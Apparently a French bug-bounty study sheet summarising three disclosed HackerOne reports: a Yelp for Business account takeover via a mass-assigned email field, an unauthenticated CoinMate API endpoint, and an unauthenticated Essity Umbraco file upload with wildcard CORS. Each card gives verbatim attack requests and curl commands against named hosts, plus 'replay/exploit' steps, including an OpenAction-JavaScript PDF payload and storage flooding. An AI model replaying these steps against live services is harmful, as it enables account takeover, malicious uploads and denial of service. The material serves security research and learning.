# Fiches SSS — API & Mobile Security

*3 fiches SSS rejouables, tirées de cas réels du corpus 2025-2026.*

### Yelp for Business: locked Email field silently editable via API

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3766455)

L'app Yelp Biz (Android) affiche le champ Email en lecture seule (cadenas), mais le endpoint de sauvegarde `POST https://biz-app.yelp.com/account/info/bio/v1` accepte une valeur `email` fournie par le client et l'applique silencieusement : ni mot de passe actuel, ni confirmation, ni vérification par e-mail avant effet. Le changement persiste et apparaît sur `graphql-mobile-api.yelp.com` (`GetAccountInfo`). Enchaîné avec `POST /account/forgot_password/v1`, l'e-mail devient l'ancre de récupération : un attaquant détenant brièvement un token de session rebascule l'adresse, déclenche un reset, fixe un nouveau mot de passe — ATO permanente.

**Cause racine :** Le endpoint bio accepte un mass-assignment du champ `email` sans contrôle renforcé, alors que `POST /account/password/v1` exige `old_password` (400 sans lui) ; l'e-mail est l'ancre de recovery du compte.

**Preuve technique (verbatim depuis la source) :**

```
POST https://biz-app.yelp.com/account/info/bio/v1
x-auth-token: <victim_token>
x-device-id: <any>
x-consumer-device-id: <any>
content-type: application/json; charset=UTF-8

{"first_name":"<current>","last_name":"<current>","email":"attacker@example.com","role":"OWNER"}
...
{"first_name":"<current>","last_name":"<current>","email":"attacker@example.com","role":"OWNER"}
...
POST https://biz-app.yelp.com/account/forgot_password/v1
content-type: application/x-www-form-urlencoded

email=attacker%40example.com
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte Yelp for Business ; un `x-auth-token` actif d'une session victime ; une boîte mail contrôlée par l'attaquant.
- Étapes : 1. Vérifier la baseline via la query GraphQL `GetAccountInfo` (e-mail légitime). 2. POSTer le JSON avec `email` attaquant sur `/account/info/bio/v1` → HTTP 200, valeur appliquée sans challenge. 3. Rejouer `GetAccountInfo` sur `graphql-mobile-api.yelp.com` pour confirmer la persistance côté données. 4. `POST /account/forgot_password/v1` avec le nouvel e-mail ; le lien `https://biz.yelp.com/forgot/reset/redirect/<token>` arrive dans la boîte attaquant ; définir un mot de passe puis se connecter.
- Pièges / limites : il faut détenir temporairement le token de session victime ; l'étape reset dépend de la livraison réelle de l'e-mail.

**Reproductibilité :** moyenne — compte Yelp Biz et token de session victime requis ; chaîne complète documentée.

**Techniques :** mass assignment, client-side enforcement bypass, email rebinding, account takeover chain, password reset abuse, api rest

**Correspond aux classes qualifiantes :** ato, broken access control, business logic

**Signal (endpoints/fonctions observés) :**
- `POST /account/info/bio/v1` (champ `email` appliqué sans challenge)
- `POST https://graphql-mobile-api.yelp.com/gql/mobile` (`GetAccountInfo`, `private.email`)
- `POST /account/forgot_password/v1`, `POST /account/password/v1` (exige `old_password`), `POST /account/login/v1`

**Paramètres impliqués :** `email`, `x-auth-token`, `first_name`, `last_name`, `role`, `old_password`

---

### POST /api/bitcoinWithdrawalFees returns financial data without authentication (CoinMate.io)

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3676308)

Le endpoint `POST /api/bitcoinWithdrawalFees` de CoinMate renvoie les frais de retrait BTC temps réel sans aucune authentification, alors que la documentation officielle le classe « USER OPERATION » (privé) et que les clients officiels l'appellent via `postPrivate()` (`clientId`, `nonce`, `publicKey`, `signature`). Tous les autres endpoints privés testés rejettent l'appel anonyme avec `{"error": true, "errorMessage": "Invalid request"}` ; lui non, et il ignore même des paramètres d'authentification factices. La réponse porte `Access-Control-Allow-Origin: *` : lisible cross-origin.

**Cause racine :** Le middleware d'authentification n'est pas appliqué à `/api/bitcoinWithdrawalFees` : « the authentication middleware is not invoked at all for this endpoint » (bypass de la vérification HMAC-SHA256).

**Preuve technique (verbatim depuis la source) :**

```
curl -s -X POST https://coinmate.io/api/bitcoinWithdrawalFees
{
  "error": false,
  "errorMessage": null,
  "data": {
    "low": 0.000011,
    "high": 0.000019,
    "timestamp": 1776286189432
  }
}
...
curl -s -X POST https://coinmate.io/api/bitcoinWithdrawalFees \
  -d "clientId=999&publicKey=FAKE_KEY&nonce=12345&signature=AAAAAAAAAAAAAAAAAAAAAA"
...
**USER OPERATION**
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte — un simple client HTTP.
- Étapes : 1. `curl -s -X POST https://coinmate.io/api/bitcoinWithdrawalFees` → données renvoyées en HTTP 200. 2. Contrôle négatif : `POST /api/balances` rejeté « Invalid request ». 3. Rejouer avec les paramètres d'authentification factices : les données reviennent quand même (middleware non invoqué). 4. Optionnel : depuis une page web, un `fetch(...)` POST lit la réponse grâce au CORS `*`.
- Pièges / limites : GET renvoie 405 (endpoint POST-only) ; l'impact reste une fuite d'information opérationnelle (pas de données de compte).

**Reproductibilité :** haute — aucun compte, une seule requête POST, endpoint accessible publiquement.

**Techniques :** missing authentication, broken access control, post-only endpoint, cors wildcard, hmac bypass, api documentation mismatch

**Correspond aux classes qualifiantes :** broken access control, info disclosure, cors misconfiguration

**Signal (endpoints/fonctions observés) :**
- `POST /api/bitcoinWithdrawalFees` (répond 200 sans credentials)
- `POST /api/balances`, `POST /api/openOrders` (contrôle négatif : « Invalid request »)
- En-tête `Access-Control-Allow-Origin: *`

**Paramètres impliqués :** `clientId`, `nonce`, `publicKey`, `signature`

---

### Unauthenticated File Upload with CORS Wildcard and No Rate Limiting (Essity)

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3765476)

Sur les instances Umbraco d'Essity, `POST /Umbraco/Api/ContactApi/SaveAttachment` accepte des uploads sans authentification, sans CAPTCHA, sans rate limiting, et renvoie `access-control-allow-origin: *`. N'importe quel site tiers peut donc uploader silencieusement des fichiers — dont des PDF avec JavaScript OpenAction destinés aux équipes qui ouvrent les pièces jointes — ou saturer le stockage (~50 Go/h depuis une IP selon le rapport).

**Cause racine :** Le contrôleur ContactApi expose `SaveAttachment` sans authentification ni contrôle d'origine ; le CORS wildcard permet l'exploitation cross-origin silencieuse depuis n'importe quel site.

**Preuve technique (verbatim depuis la source) :**

```
curl -sk -X POST 'https://████████/Umbraco/Api/ContactApi/SaveAttachment' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -F 'file=@/tmp/test.png;type=image/png;filename=test.png'
...
["2e1ab0fe-db41-45ee-ad63-954edf814f77_test.png"]
...
access-control-allow-origin: *
...
<< /Type /Action /S /JavaScript /JS (app.alert('matty69v XSS PoC - document.domain')) >>
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte ; une instance exposant `/Umbraco/Api/ContactApi/SaveAttachment`.
- Étapes : 1. POSTer un fichier minimal avec `X-Requested-With: XMLHttpRequest` → réponse = nom de stockage (ex. UUID_test.png). 2. Vérifier le préflight `OPTIONS` avec `Origin: https://evil.attacker.com` → `access-control-allow-origin: *`. 3. Héberger une page JS qui POSTe un PDF à OpenAction JavaScript : upload silencieux chez tout visiteur — ou boucler des uploads 10 Mo pour un déni de stockage (10 uploads concurrents réussis en ~6 s dans le rapport).
- Pièges / limites : hôtes masqués dans le rapport ; l'effet du PDF à OpenAction dépend du viewer / de l'ouverture par un humain.

**Reproductibilité :** moyenne — l'endpoint est exploitable sans compte, mais les hôtes exacts sont masqués dans la source.

**Techniques :** unauthenticated upload, cors wildcard, missing rate limit, malicious pdf openaction, storage dos, umbraco contactapi

**Correspond aux classes qualifiantes :** unauthenticated file upload, cors misconfiguration, dos, stored xss via pdf

**Signal (endpoints/fonctions observés) :**
- `POST /Umbraco/Api/ContactApi/SaveAttachment` (`file`, `X-Requested-With`)
- Préflight `OPTIONS` → `access-control-allow-origin: *`
- Upload PDF `/OpenAction` JavaScript accepté

**Paramètres impliqués :** `file`, `X-Requested-With`, `Origin`
